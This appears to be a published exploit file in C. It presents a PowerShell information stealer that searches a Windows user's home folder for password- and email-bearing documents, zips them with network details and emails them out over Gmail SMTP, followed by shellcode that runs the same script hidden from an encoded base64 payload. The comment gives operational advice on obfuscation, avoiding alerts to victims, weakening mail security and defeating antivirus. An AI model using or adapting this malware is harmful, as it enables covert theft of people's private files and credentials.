#include <stdio.h>
#include <string.h>


/*
# Exploit Title: [Crawl through $HOME and search for files that have email-like-format and send via SMTP]
# Date: [5/12/2017]
# Exploit Author: [Scourge]
# Vendor Homepage: [Microsoft.com]
# Software Link: [Microsoft.com]
# Version: [5.1.14393.1198 and Rmutate 1.1]
# Tested on: [Windows 10 64-bit (but programed in 32-bit)]
# Licence: GPLv3


I am here to introduce a new way of thinking when you make your next shellcode
for those you who are not good at the assembly language.

I created a tool "Rmutate" short for Reverse Mutation to reverse the level of your code
I have release the Windows and Linux version.
You must have python3 x64 version (not 32) on Windows
You could also cross-compile, use Rmutate on Kali (which has x64 version by default)

git clone https://github.com/Radicalware/Malware_Tools <folder to download to>

In this example, I will create a shellcode using my tool "Rmutate" that will
crawl thre the $HOME directory and look for (docx|rtf|txt) files that have (Pp|a@A|s$S|s$S) as the filename. 
It will also look through the (docx|rtf|txt) files for an email-like structure
and send the found files to the users favorites folder (somewhere out of the way. It will then add a file with
netowork informat, zip up the files and send it to a gmail account. (really you want to use an un-restricted
personal email server). If you do use a gmail account, login to your unsecure email, go to "Details" at the
bottom right hand of the page and turn off security so that un-registerd computers (being the victims) can login 
to your email and send to your secure email the zipped file. Also, this script will skip files over 10000 bytes long.


First modify the following code and add it to .\steal_info.ps1

CHANGE THE FOLLOWING
"YOUR PASSWORD"
$From = "UNSECURE@gmail.com";
$To = "SECURE@gmail.com";
$User = "UNSECURE";
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------
##########################################################################################################################################################################
$folder_array = [System.Collections.ArrayList]@()

$lsFolders = [System.Collections.ArrayList]@()


$file_content = @((Get-ChildItem -path $HOME\Desktop -Recurse | Out-String).split("`n"))

foreach ($item in $file_content){
    if ($item | Select-String '    Directory:'){
        $lsFolders.Add($item) 
    }
}
foreach ($item in $lsFolders){
    $item = $item.replace('    Directory: ','')
    $folder_array.Add($item)
}

#foreach ($folder in $folder_array){$folder}

$pass_pattern = ""
$pItem = @('P','p'); $aItem = @('a','@','A');$sItem = @('\$','s','S')
foreach ($p in $pItem){
    foreach ($a in $aItem){
        foreach ($s in $sItem){
            foreach ($s in $sItem){
                $pass_pattern += "($p$a$s$s)|"
            }
        }
    }
}
$pass_pattern = $pass_pattern -replace "\|$",""
$domains = @('net','com','info','org')
$email = ""
foreach ($domain in $domains){
    $email += "([\W+]*\w+@*\w+\.$domain)|"
}
$email = $email -replace "\|$",""


$Targets = [System.Collections.ArrayList]@()


foreach ($location in $folder_array){

   
    $location = $location -replace (".$")
    $files = @((Get-ChildItem -Path $location| Out-String).split("`n"))
    $file_path = [System.Collections.ArrayList]@()
    foreach($file in $files){
        if ($file -match '-a'){
            $file = (($file -replace '[^:].[0-9]\s{1}','***').split('***')[6]) 
            $file_path.Add("$location\$file")|Out-Null
        }

        
    }
    
    $item = ''
    foreach ($item in $file_path){
        $item = $item -replace ("\s*$",'') 

        if ($item -match "(docx$)|(rtf$)|(txt$)"){
                       
            $content = gc $item
 

            if (($item | Select-String -SimpleMatch $email)-or ($item | Select-String -pattern $pass_pattern)){
                $Targets.Add($item)|Out-Null
            }
                
            elseif (($content | Select-String -pattern $email)){
                $Targets.Add($item)|Out-Null
            }
            
        }
    }
}


$zip_it = [System.Collections.ArrayList]@()

foreach ($item in $targets){$item}


foreach ($item in $targets){
    $size = (Get-Item $item).length
    if ($size -le 10000){
        $zip_it.Add($item)|Out-Null
    }
}

Remove-Item $HOME\Favorites\zip_ready -Recurse
mkdir "$HOME\Favorites\zip_ready" 
foreach ($item in $zip_it){
    copy $item "$HOME\Favorites\zip_ready" 
}


Invoke-RestMethod http://ipinfo.io/json > $HOME\Favorites\zip_ready\1_net_info.txt 

Compress-Archive -Path "$HOME\Favorites\zip_ready" -DestinationPath "$HOME\Favorites\zip_ready\zip_ready.zip"

$From = "UNSECURE@gmail.com";
$To = "SECURE@gmail.com";
$package = "$HOME\Favorites\zip_ready\zip_ready.zip";
$Subject = "to fv!!";
$Body = "zipped";
$SMTPServer = "smtp.gmail.com";
$SMTPPort = "587";

$User = "UNSECURE";
$PWord = ConvertTo-SecureString -String "YOUR PASSWORD" -AsPlainText -Force;
$Credential = New-Object -TypeName "System.Management.Automation.PSCredential" -ArgumentList $User, $PWord;
Send-MailMessage -From $From -to $To -Subject $Subject -Body $Body -SmtpServer $SMTPServer -port $SMTPPort -UseSsl -Credential $Credential -Attachments $package

Remove-Item $HOME\Favorites\zip_ready -Recurse




##########################################################################################################################################################################
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------

run this: .\Rmutate -f6 .\steal_info.ps1 -ps

or run this .\Rmutate -f6 .\steal_info.ps1 -ps -o

the -o option will strip beginning spaces, remove un-needed semi-colons and new-lines, and change all vars to a couple of chars
In short, the -o option will obfuscate, cutting  your byte count in half.
combine the -o with a d, so -od to debug if there is an issue. I have tested this code so it works. (don't use 'd' option)
The d could be to check for non-utf-8 chars

Rmutate will easily convert your file to base64 and give a pre-executing script for
powershell
powershell elevated (uac prompt)
python2
python3
ruby

It is important here to chose powershell (no UAC) with the -ps option because we don't
want to alert our victms and this code does not need elevated rights.
If your code does need elevated rights, I suggest executing an exploit, creating an admin user, (set a timer after the exploit)
then "run as" with your new credentials to auto-execute your malware.

If you are running Rmutate in a cmd.exe environment use -bat instead of -ps: YOUR CODE WILL BREAK IF YOU DON'T CHOSE CORRECTLY
If you are in cmd, and want to use powershell '-ps', just type in powershell and press enter, to change your shell type


After executing 
.\Rmutate -f6 .\steal_info.ps1 -ps -o
or 
.\Rmutate -f6 .\steal_info.ps1 -ps
Your code will automatically be sent to your clipboard

With Rmutate 3 things are required

Target OS (-win, -linux, -osx)
-s for script followed by the script itself (which now should be in your clipboard)

Rmutate -win -s "paste here without quotes" -ex

the -ex will automatically execute the shellcode
NOTE: This script takes about 20 seconds to complete for me. It may take longer depending on how much you hage in your
$HOME directory. Point being, after you auto-execute, be patient. 

Be usre to use the -h options to learn more about file managment like renaming, folderizing, sending to metasploit, etc.

If you are having trouble with the -ps option, just remove the windowstyle hidden from the code so you get the debugging info.
If your powershell code works in powershell and not in my tool, it's probably because you are using -ps in cmd or -bat in powershell.
or because you have non-utf-8 chars. use "Rmutate -f6 .\script.ps1 -ps -d" and you will get a printout copy. If you see ??? then you 
have non-utf-8 chars to fix.

Also remember to use the -jcp option when targeting unix if you don't want to double-space out every register.
Also, if you are targeting OSX use the powershell2.7 option or ruby (osx does not come with py3 by default)

That's it for now, please send all bugs to Scourge/at\protonmail/\com
I plan on starting a very powerful encoder project in about 6 months (so it will be released in about a year). I think you will all
really enjoy it sense it will put the nail in the coffin for AV, I needed to make this first so I had a platform I could actually work with.


btw: you could just zip the google chrome data and send it but that would be too easy.

git clone https://github.com/Radicalware/Malware_Tools <folder to download to>


*/

char shellcode[] =
	
"\x31\xc9\x6a\x30\x5e\x64\xad\x8b\x40\x0c\x8b\x70\x14\xad\x89"
"\xc6\xad\x8b\x58\x10\x8b\x53\x3c\x01\xda\x8b\x52\x78\x01\xda"
"\x8b\x72\x20\x01\xde\x41\xad\x01\xd8\x81\x38\x47\x65\x74\x50"
"\x75\xf4\x81\x78\x04\x72\x6f\x63\x41\x75\xeb\x81\x78\x08\x64"
"\x64\x72\x65\x75\xe2\x8b\x72\x24\x01\xde\x66\x8b\x0c\x4e\x49"
"\x8b\x72\x1c\x01\xde\x8b\x14\x8e\x01\xda\x31\xf6\x52\x5e\x31"
"\xff\x53\x5f\x31\xc9\x51\x6a\x63\x66\x68\x78\x65\x68\x57\x69"
"\x6e\x45\x89\xe1\x51\x53\xff\xd2\x31\xc9\x51\x6a\x73\x66\x68"
"\x65\x73\x68\x50\x72\x6f\x63\x68\x45\x78\x69\x74\x89\xe1\x51"
"\x57\x31\xff\x89\xc7\xff\xd6\x31\xf6\x50\x5e\x31\xc9\x51\xeb"
"\x08\x59\x56\x51\xff\xd7\x56\xff\xd6\xe8\xf3\xff\xff\xff\x70"
"\x6f\x77\x65\x72\x73\x68\x65\x6c\x6c\x2e\x65\x78\x65\x20\x2d"
"\x57\x69\x6e\x64\x6f\x77\x53\x74\x79\x6c\x65\x20\x48\x69\x64"
"\x64\x65\x6e\x20\x2f\x63\x20\x22\x24\x61\x20\x3d\x20\x5b\x53"
"\x79\x73\x74\x65\x6d\x2e\x54\x65\x78\x74\x2e\x45\x6e\x63\x6f"
"\x64\x69\x6e\x67\x5d\x3a\x3a\x41\x53\x43\x49\x49\x2e\x47\x65"
"\x74\x53\x74\x72\x69\x6e\x67\x28\x5b\x53\x79\x73\x74\x65\x6d"
"\x2e\x43\x6f\x6e\x76\x65\x72\x74\x5d\x3a\x3a\x46\x72\x6f\x6d"
"\x42\x61\x73\x65\x36\x34\x53\x74\x72\x69\x6e\x67\x28\x5c\x22"
"\x4a\x48\x42\x68\x49\x44\x30\x67\x57\x31\x4e\x35\x63\x33\x52"
"\x6c\x62\x53\x35\x44\x62\x32\x78\x73\x5a\x57\x4e\x30\x61\x57"
"\x39\x75\x63\x79\x35\x42\x63\x6e\x4a\x68\x65\x55\x78\x70\x63"
"\x33\x52\x64\x51\x43\x67\x70\x4f\x79\x52\x68\x5a\x79\x41\x39"
"\x49\x46\x74\x54\x65\x58\x4e\x30\x5a\x57\x30\x75\x51\x32\x39"
"\x73\x62\x47\x56\x6a\x64\x47\x6c\x76\x62\x6e\x4d\x75\x51\x58"
"\x4a\x79\x59\x58\x6c\x4d\x61\x58\x4e\x30\x58\x55\x41\x6f\x4b"
"\x54\x73\x6b\x63\x57\x45\x67\x50\x53\x42\x41\x4b\x43\x68\x48"
"\x5a\x58\x51\x74\x51\x32\x68\x70\x62\x47\x52\x4a\x64\x47\x56"
"\x74\x49\x43\x31\x77\x59\x58\x52\x6f\x49\x43\x52\x6f\x62\x32"
"\x31\x6c\x58\x45\x52\x6c\x63\x32\x74\x30\x62\x33\x41\x67\x4c"
"\x56\x4a\x6c\x59\x33\x56\x79\x63\x32\x55\x67\x66\x43\x42\x50"
"\x64\x58\x51\x74\x55\x33\x52\x79\x61\x57\x35\x6e\x4b\x53\x35"
"\x7a\x63\x47\x78\x70\x64\x43\x67\x69\x59\x47\x34\x69\x4b\x53"
"\x6b\x37\x5a\x6d\x39\x79\x5a\x57\x46\x6a\x61\x43\x41\x6f\x4a"
"\x47\x74\x68\x49\x47\x6c\x75\x49\x43\x52\x78\x59\x53\x6c\x37"
"\x61\x57\x59\x67\x4b\x43\x52\x72\x59\x53\x42\x38\x49\x46\x4e"
"\x6c\x62\x47\x56\x6a\x64\x43\x31\x54\x64\x48\x4a\x70\x62\x6d"
"\x63\x67\x4a\x79\x41\x67\x49\x43\x42\x45\x61\x58\x4a\x6c\x59"
"\x33\x52\x76\x63\x6e\x6b\x36\x4a\x79\x6c\x37\x4a\x47\x46\x6e"
"\x4c\x6b\x46\x6b\x5a\x43\x67\x6b\x61\x32\x45\x70\x49\x48\x77"
"\x67\x54\x33\x56\x30\x4c\x55\x35\x31\x62\x47\x78\x39\x66\x57"
"\x5a\x76\x63\x6d\x56\x68\x59\x32\x67\x67\x4b\x43\x52\x72\x59"
"\x53\x42\x70\x62\x69\x41\x6b\x59\x57\x63\x70\x65\x79\x52\x72"
"\x59\x53\x41\x39\x49\x43\x52\x72\x59\x53\x35\x79\x5a\x58\x42"
"\x73\x59\x57\x4e\x6c\x4b\x43\x63\x67\x49\x43\x41\x67\x52\x47"
"\x6c\x79\x5a\x57\x4e\x30\x62\x33\x4a\x35\x4f\x69\x41\x6e\x4c"
"\x43\x63\x6e\x4b\x54\x73\x6b\x63\x47\x45\x75\x51\x57\x52\x6b"
"\x4b\x43\x52\x72\x59\x53\x6c\x38\x49\x45\x39\x31\x64\x43\x31"
"\x4f\x64\x57\x78\x73\x66\x53\x52\x6d\x5a\x79\x41\x39\x49\x43"
"\x49\x69\x4f\x79\x52\x69\x5a\x79\x41\x39\x49\x45\x41\x6f\x4a"
"\x31\x41\x6e\x4c\x43\x64\x77\x4a\x79\x6b\x37\x49\x43\x52\x71"
"\x5a\x79\x41\x39\x49\x45\x41\x6f\x4a\x32\x45\x6e\x4c\x43\x64"
"\x41\x4a\x79\x77\x6e\x51\x53\x63\x70\x4f\x79\x52\x75\x5a\x79"
"\x41\x39\x49\x45\x41\x6f\x4a\x31\x77\x6b\x4a\x79\x77\x6e\x63"
"\x79\x63\x73\x4a\x31\x4d\x6e\x4b\x54\x74\x6d\x62\x33\x4a\x6c"
"\x59\x57\x4e\x6f\x49\x43\x67\x6b\x63\x43\x42\x70\x62\x69\x41"
"\x6b\x59\x6d\x63\x70\x65\x32\x5a\x76\x63\x6d\x56\x68\x59\x32"
"\x67\x67\x4b\x43\x52\x68\x49\x47\x6c\x75\x49\x43\x52\x71\x5a"
"\x79\x6c\x37\x5a\x6d\x39\x79\x5a\x57\x46\x6a\x61\x43\x41\x6f"
"\x4a\x48\x4d\x67\x61\x57\x34\x67\x4a\x47\x35\x6e\x4b\x58\x74"
"\x6d\x62\x33\x4a\x6c\x59\x57\x4e\x6f\x49\x43\x67\x6b\x63\x79"
"\x42\x70\x62\x69\x41\x6b\x62\x6d\x63\x70\x65\x79\x52\x6d\x5a"
"\x79\x41\x72\x50\x53\x41\x69\x4b\x43\x52\x77\x4a\x47\x45\x6b"
"\x63\x79\x52\x7a\x4b\x58\x77\x69\x66\x58\x31\x39\x66\x53\x52"
"\x6d\x5a\x79\x41\x39\x49\x43\x52\x6d\x5a\x79\x41\x74\x63\x6d"
"\x56\x77\x62\x47\x46\x6a\x5a\x53\x41\x69\x58\x48\x77\x6b\x49"
"\x69\x77\x69\x49\x6a\x73\x6b\x62\x57\x63\x67\x50\x53\x42\x41"
"\x4b\x43\x64\x75\x5a\x58\x51\x6e\x4c\x43\x64\x6a\x62\x32\x30"
"\x6e\x4c\x43\x64\x70\x62\x6d\x5a\x76\x4a\x79\x77\x6e\x62\x33"
"\x4a\x6e\x4a\x79\x6b\x37\x4a\x47\x6c\x6e\x49\x44\x30\x67\x49"
"\x69\x49\x37\x5a\x6d\x39\x79\x5a\x57\x46\x6a\x61\x43\x41\x6f"
"\x4a\x47\x5a\x68\x49\x47\x6c\x75\x49\x43\x52\x74\x5a\x79\x6c"
"\x37\x4a\x47\x6c\x6e\x49\x43\x73\x39\x49\x43\x49\x6f\x57\x31"
"\x78\x58\x4b\x31\x30\x71\x58\x48\x63\x72\x51\x43\x70\x63\x64"
"\x79\x74\x63\x4c\x69\x52\x6d\x59\x53\x6c\x38\x49\x6e\x30\x6b"
"\x61\x57\x63\x67\x50\x53\x41\x6b\x61\x57\x63\x67\x4c\x58\x4a"
"\x6c\x63\x47\x78\x68\x59\x32\x55\x67\x49\x6c\x78\x38\x4a\x43"
"\x49\x73\x49\x69\x49\x37\x4a\x47\x74\x6e\x49\x44\x30\x67\x57"
"\x31\x4e\x35\x63\x33\x52\x6c\x62\x53\x35\x44\x62\x32\x78\x73"
"\x5a\x57\x4e\x30\x61\x57\x39\x75\x63\x79\x35\x42\x63\x6e\x4a"
"\x68\x65\x55\x78\x70\x63\x33\x52\x64\x51\x43\x67\x70\x4f\x32"
"\x5a\x76\x63\x6d\x56\x68\x59\x32\x67\x67\x4b\x43\x52\x6b\x5a"
"\x79\x42\x70\x62\x69\x41\x6b\x63\x47\x45\x70\x65\x79\x52\x6b"
"\x5a\x79\x41\x39\x49\x43\x52\x6b\x5a\x79\x41\x74\x63\x6d\x56"
"\x77\x62\x47\x46\x6a\x5a\x53\x41\x6f\x49\x69\x34\x6b\x49\x69"
"\x6b\x37\x4a\x47\x78\x68\x49\x44\x30\x67\x51\x43\x67\x6f\x52"
"\x32\x56\x30\x4c\x55\x4e\x6f\x61\x57\x78\x6b\x53\x58\x52\x6c"
"\x62\x53\x41\x74\x55\x47\x46\x30\x61\x43\x41\x6b\x5a\x47\x64"
"\x38\x49\x45\x39\x31\x64\x43\x31\x54\x64\x48\x4a\x70\x62\x6d"
"\x63\x70\x4c\x6e\x4e\x77\x62\x47\x6c\x30\x4b\x43\x4a\x67\x62"
"\x69\x49\x70\x4b\x54\x73\x6b\x63\x57\x63\x67\x50\x53\x42\x62"
"\x55\x33\x6c\x7a\x64\x47\x56\x74\x4c\x6b\x4e\x76\x62\x47\x78"
"\x6c\x59\x33\x52\x70\x62\x32\x35\x7a\x4c\x6b\x46\x79\x63\x6d"
"\x46\x35\x54\x47\x6c\x7a\x64\x46\x31\x41\x4b\x43\x6b\x37\x5a"
"\x6d\x39\x79\x5a\x57\x46\x6a\x61\x43\x67\x6b\x62\x47\x63\x67"
"\x61\x57\x34\x67\x4a\x47\x78\x68\x4b\x58\x74\x70\x5a\x69\x41"
"\x6f\x4a\x47\x78\x6e\x49\x43\x31\x74\x59\x58\x52\x6a\x61\x43"
"\x41\x6e\x4c\x57\x45\x6e\x4b\x58\x73\x6b\x62\x47\x63\x67\x50"
"\x53\x41\x6f\x4b\x43\x52\x73\x5a\x79\x41\x74\x63\x6d\x56\x77"
"\x62\x47\x46\x6a\x5a\x53\x41\x6e\x57\x31\x34\x36\x58\x53\x35"
"\x62\x4d\x43\x30\x35\x58\x56\x78\x7a\x65\x7a\x46\x39\x4a\x79"
"\x77\x6e\x4b\x69\x6f\x71\x4a\x79\x6b\x75\x63\x33\x42\x73\x61"
"\x58\x51\x6f\x4a\x79\x6f\x71\x4b\x69\x63\x70\x57\x7a\x5a\x64"
"\x4b\x53\x41\x37\x4a\x48\x46\x6e\x4c\x6b\x46\x6b\x5a\x43\x67"
"\x69\x4a\x47\x52\x6e\x58\x43\x52\x73\x5a\x79\x49\x70\x66\x45"
"\x39\x31\x64\x43\x31\x4f\x64\x57\x78\x73\x66\x58\x30\x6b\x61"
"\x32\x45\x67\x50\x53\x41\x6e\x4a\x7a\x74\x6d\x62\x33\x4a\x6c"
"\x59\x57\x4e\x6f\x49\x43\x67\x6b\x61\x32\x45\x67\x61\x57\x34"
"\x67\x4a\x48\x46\x6e\x4b\x58\x73\x6b\x61\x32\x45\x67\x50\x53"
"\x41\x6b\x61\x32\x45\x67\x4c\x58\x4a\x6c\x63\x47\x78\x68\x59"
"\x32\x55\x67\x4b\x43\x4a\x63\x63\x79\x6f\x6b\x49\x69\x77\x6e"
"\x4a\x79\x6b\x67\x4f\x32\x6c\x6d\x49\x43\x67\x6b\x61\x32\x45"
"\x67\x4c\x57\x31\x68\x64\x47\x4e\x6f\x49\x43\x49\x6f\x5a\x47"
"\x39\x6a\x65\x43\x51\x70\x66\x43\x68\x79\x64\x47\x59\x6b\x4b"
"\x58\x77\x6f\x64\x48\x68\x30\x4a\x43\x6b\x69\x4b\x58\x73\x6b"
"\x62\x32\x63\x67\x50\x53\x42\x6e\x59\x79\x41\x6b\x61\x32\x45"
"\x37\x61\x57\x59\x67\x4b\x43\x67\x6b\x61\x32\x45\x67\x66\x43"
"\x42\x54\x5a\x57\x78\x6c\x59\x33\x51\x74\x55\x33\x52\x79\x61"
"\x57\x35\x6e\x49\x43\x31\x54\x61\x57\x31\x77\x62\x47\x56\x4e"
"\x59\x58\x52\x6a\x61\x43\x41\x6b\x61\x57\x63\x70\x4c\x57\x39"
"\x79\x49\x43\x67\x6b\x61\x32\x45\x67\x66\x43\x42\x54\x5a\x57"
"\x78\x6c\x59\x33\x51\x74\x55\x33\x52\x79\x61\x57\x35\x6e\x49"
"\x43\x31\x77\x59\x58\x52\x30\x5a\x58\x4a\x75\x49\x43\x52\x6d"
"\x5a\x79\x6b\x70\x65\x79\x52\x72\x5a\x79\x35\x42\x5a\x47\x51"
"\x6f\x4a\x47\x74\x68\x4b\x58\x78\x50\x64\x58\x51\x74\x54\x6e"
"\x56\x73\x62\x48\x31\x6c\x62\x48\x4e\x6c\x61\x57\x59\x67\x4b"
"\x43\x67\x6b\x62\x32\x63\x67\x66\x43\x42\x54\x5a\x57\x78\x6c"
"\x59\x33\x51\x74\x55\x33\x52\x79\x61\x57\x35\x6e\x49\x43\x31"
"\x77\x59\x58\x52\x30\x5a\x58\x4a\x75\x49\x43\x52\x70\x5a\x79"
"\x6b\x70\x65\x79\x52\x72\x5a\x79\x35\x42\x5a\x47\x51\x6f\x4a"
"\x47\x74\x68\x4b\x58\x78\x50\x64\x58\x51\x74\x54\x6e\x56\x73"
"\x62\x48\x31\x39\x66\x58\x30\x6b\x61\x6d\x45\x67\x50\x53\x42"
"\x62\x55\x33\x6c\x7a\x64\x47\x56\x74\x4c\x6b\x4e\x76\x62\x47"
"\x78\x6c\x59\x33\x52\x70\x62\x32\x35\x7a\x4c\x6b\x46\x79\x63"
"\x6d\x46\x35\x54\x47\x6c\x7a\x64\x46\x31\x41\x4b\x43\x6b\x37"
"\x5a\x6d\x39\x79\x5a\x57\x46\x6a\x61\x43\x41\x6f\x4a\x47\x74"
"\x68\x49\x47\x6c\x75\x49\x43\x52\x72\x5a\x79\x6c\x37\x4a\x47"
"\x74\x68\x66\x57\x5a\x76\x63\x6d\x56\x68\x59\x32\x67\x67\x4b"
"\x43\x52\x72\x59\x53\x42\x70\x62\x69\x41\x6b\x61\x32\x63\x70"
"\x65\x79\x52\x6e\x5a\x79\x41\x39\x49\x43\x68\x48\x5a\x58\x51"
"\x74\x53\x58\x52\x6c\x62\x53\x41\x6b\x61\x32\x45\x70\x4c\x6d"
"\x78\x6c\x62\x6d\x64\x30\x61\x44\x74\x70\x5a\x69\x41\x6f\x4a"
"\x47\x64\x6e\x49\x43\x31\x73\x5a\x53\x41\x78\x4d\x44\x41\x77"
"\x4d\x43\x6c\x37\x4a\x47\x70\x68\x4c\x6b\x46\x6b\x5a\x43\x67"
"\x6b\x61\x32\x45\x70\x66\x45\x39\x31\x64\x43\x31\x4f\x64\x57"
"\x78\x73\x66\x58\x31\x53\x5a\x57\x31\x76\x64\x6d\x55\x74\x53"
"\x58\x52\x6c\x62\x53\x41\x6b\x61\x47\x39\x74\x5a\x56\x78\x47"
"\x59\x58\x5a\x76\x63\x6d\x6c\x30\x5a\x58\x4e\x63\x65\x6d\x6c"
"\x77\x58\x33\x4a\x6c\x59\x57\x52\x35\x49\x43\x31\x53\x5a\x57"
"\x4e\x31\x63\x6e\x4e\x6c\x4f\x32\x31\x72\x5a\x47\x6c\x79\x49"
"\x43\x49\x6b\x61\x47\x39\x74\x5a\x56\x78\x47\x59\x58\x5a\x76"
"\x63\x6d\x6c\x30\x5a\x58\x4e\x63\x65\x6d\x6c\x77\x58\x33\x4a"
"\x6c\x59\x57\x52\x35\x49\x69\x42\x38\x49\x45\x39\x31\x64\x43"
"\x31\x4f\x64\x57\x78\x73\x4f\x32\x5a\x76\x63\x6d\x56\x68\x59"
"\x32\x67\x67\x4b\x43\x52\x72\x59\x53\x42\x70\x62\x69\x41\x6b"
"\x61\x6d\x45\x70\x65\x32\x4e\x76\x63\x48\x6b\x67\x4a\x47\x74"
"\x68\x49\x43\x49\x6b\x61\x47\x39\x74\x5a\x56\x78\x47\x59\x58"
"\x5a\x76\x63\x6d\x6c\x30\x5a\x58\x4e\x63\x65\x6d\x6c\x77\x58"
"\x33\x4a\x6c\x59\x57\x52\x35\x49\x69\x42\x39\x53\x57\x35\x32"
"\x62\x32\x74\x6c\x4c\x56\x4a\x6c\x63\x33\x52\x4e\x5a\x58\x52"
"\x6f\x62\x32\x51\x67\x61\x48\x52\x30\x63\x44\x6f\x76\x4c\x32"
"\x6c\x77\x61\x57\x35\x6d\x62\x79\x35\x70\x62\x79\x39\x71\x63"
"\x32\x39\x75\x49\x44\x34\x67\x4a\x47\x68\x76\x62\x57\x56\x63"
"\x52\x6d\x46\x32\x62\x33\x4a\x70\x64\x47\x56\x7a\x58\x48\x70"
"\x70\x63\x46\x39\x79\x5a\x57\x46\x6b\x65\x56\x77\x78\x58\x32"
"\x35\x6c\x64\x46\x39\x70\x62\x6d\x5a\x76\x4c\x6e\x52\x34\x64"
"\x43\x41\x37\x51\x32\x39\x74\x63\x48\x4a\x6c\x63\x33\x4d\x74"
"\x51\x58\x4a\x6a\x61\x47\x6c\x32\x5a\x53\x41\x74\x55\x47\x46"
"\x30\x61\x43\x41\x69\x4a\x47\x68\x76\x62\x57\x56\x63\x52\x6d"
"\x46\x32\x62\x33\x4a\x70\x64\x47\x56\x7a\x58\x48\x70\x70\x63"
"\x46\x39\x79\x5a\x57\x46\x6b\x65\x53\x49\x67\x4c\x55\x52\x6c"
"\x63\x33\x52\x70\x62\x6d\x46\x30\x61\x57\x39\x75\x55\x47\x46"
"\x30\x61\x43\x41\x69\x4a\x47\x68\x76\x62\x57\x56\x63\x52\x6d"
"\x46\x32\x62\x33\x4a\x70\x64\x47\x56\x7a\x58\x48\x70\x70\x63"
"\x46\x39\x79\x5a\x57\x46\x6b\x65\x56\x78\x36\x61\x58\x42\x66"
"\x63\x6d\x56\x68\x5a\x48\x6b\x75\x65\x6d\x6c\x77\x49\x6a\x74"
"\x6c\x65\x47\x6c\x30\x4f\x79\x52\x6c\x5a\x79\x41\x39\x49\x43"
"\x4a\x56\x54\x6c\x4e\x46\x51\x31\x56\x53\x52\x55\x42\x6e\x62"
"\x57\x46\x70\x62\x43\x35\x6a\x62\x32\x30\x69\x4f\x79\x52\x69"
"\x59\x53\x41\x39\x49\x43\x4a\x54\x52\x55\x4e\x56\x55\x6b\x56"
"\x41\x5a\x32\x31\x68\x61\x57\x77\x75\x59\x32\x39\x74\x49\x6a"
"\x73\x6b\x63\x6d\x63\x67\x50\x53\x41\x69\x4a\x47\x68\x76\x62"
"\x57\x56\x63\x52\x6d\x46\x32\x62\x33\x4a\x70\x64\x47\x56\x7a"
"\x58\x48\x70\x70\x63\x46\x39\x79\x5a\x57\x46\x6b\x65\x56\x78"
"\x36\x61\x58\x42\x66\x63\x6d\x56\x68\x5a\x48\x6b\x75\x65\x6d"
"\x6c\x77\x49\x6a\x73\x6b\x63\x6d\x45\x67\x50\x53\x41\x69\x64"
"\x47\x38\x67\x5a\x6e\x59\x68\x49\x53\x49\x37\x4a\x48\x42\x6e"
"\x49\x44\x30\x67\x49\x6e\x70\x70\x63\x48\x42\x6c\x5a\x43\x49"
"\x37\x4a\x47\x64\x68\x49\x44\x30\x67\x49\x6e\x4e\x74\x64\x48"
"\x41\x75\x5a\x32\x31\x68\x61\x57\x77\x75\x59\x32\x39\x74\x49"
"\x6a\x73\x6b\x62\x32\x45\x67\x50\x53\x41\x69\x4e\x54\x67\x33"
"\x49\x6a\x73\x6b\x5a\x57\x45\x67\x50\x53\x41\x69\x56\x55\x35"
"\x54\x52\x55\x4e\x56\x55\x6b\x55\x69\x4f\x79\x52\x6b\x59\x53"
"\x41\x39\x49\x45\x4e\x76\x62\x6e\x5a\x6c\x63\x6e\x52\x55\x62"
"\x79\x31\x54\x5a\x57\x4e\x31\x63\x6d\x56\x54\x64\x48\x4a\x70"
"\x62\x6d\x63\x67\x4c\x56\x4e\x30\x63\x6d\x6c\x75\x5a\x79\x41"
"\x69\x57\x55\x39\x56\x55\x69\x42\x51\x51\x56\x4e\x54\x56\x30"
"\x39\x53\x52\x43\x49\x67\x4c\x55\x46\x7a\x55\x47\x78\x68\x61"
"\x57\x35\x55\x5a\x58\x68\x30\x49\x43\x31\x47\x62\x33\x4a\x6a"
"\x5a\x54\x73\x6b\x62\x6d\x45\x67\x50\x53\x42\x4f\x5a\x58\x63"
"\x74\x54\x32\x4a\x71\x5a\x57\x4e\x30\x49\x43\x31\x55\x65\x58"
"\x42\x6c\x54\x6d\x46\x74\x5a\x53\x41\x69\x55\x33\x6c\x7a\x64"
"\x47\x56\x74\x4c\x6b\x31\x68\x62\x6d\x46\x6e\x5a\x57\x31\x6c"
"\x62\x6e\x51\x75\x51\x58\x56\x30\x62\x32\x31\x68\x64\x47\x6c"
"\x76\x62\x69\x35\x51\x55\x30\x4e\x79\x5a\x57\x52\x6c\x62\x6e"
"\x52\x70\x59\x57\x77\x69\x49\x43\x31\x42\x63\x6d\x64\x31\x62"
"\x57\x56\x75\x64\x45\x78\x70\x63\x33\x51\x67\x4a\x47\x56\x68"
"\x4c\x43\x41\x6b\x5a\x47\x45\x37\x55\x32\x56\x75\x5a\x43\x31"
"\x4e\x59\x57\x6c\x73\x54\x57\x56\x7a\x63\x32\x46\x6e\x5a\x53"
"\x41\x74\x52\x6e\x4a\x76\x62\x53\x41\x6b\x5a\x57\x63\x67\x4c"
"\x58\x52\x76\x49\x43\x52\x69\x59\x53\x41\x74\x55\x33\x56\x69"
"\x61\x6d\x56\x6a\x64\x43\x41\x6b\x63\x6d\x45\x67\x4c\x55\x4a"
"\x76\x5a\x48\x6b\x67\x4a\x48\x42\x6e\x49\x43\x31\x54\x62\x58"
"\x52\x77\x55\x32\x56\x79\x64\x6d\x56\x79\x49\x43\x52\x6e\x59"
"\x53\x41\x74\x63\x47\x39\x79\x64\x43\x41\x6b\x62\x32\x45\x67"
"\x4c\x56\x56\x7a\x5a\x56\x4e\x7a\x62\x43\x41\x74\x51\x33\x4a"
"\x6c\x5a\x47\x56\x75\x64\x47\x6c\x68\x62\x43\x41\x6b\x62\x6d"
"\x45\x67\x4c\x55\x46\x30\x64\x47\x46\x6a\x61\x47\x31\x6c\x62"
"\x6e\x52\x7a\x49\x43\x52\x79\x5a\x7a\x74\x53\x5a\x57\x31\x76"
"\x64\x6d\x55\x74\x53\x58\x52\x6c\x62\x53\x41\x6b\x61\x47\x39"
"\x74\x5a\x56\x78\x47\x59\x58\x5a\x76\x63\x6d\x6c\x30\x5a\x58"
"\x4e\x63\x65\x6d\x6c\x77\x58\x33\x4a\x6c\x59\x57\x52\x35\x49"
"\x43\x31\x53\x5a\x57\x4e\x31\x63\x6e\x4e\x6c\x5c\x22\x29\x29"
"\x3b\x20\x69\x6e\x76\x6f\x6b\x65\x2d\x65\x78\x70\x72\x65\x73"
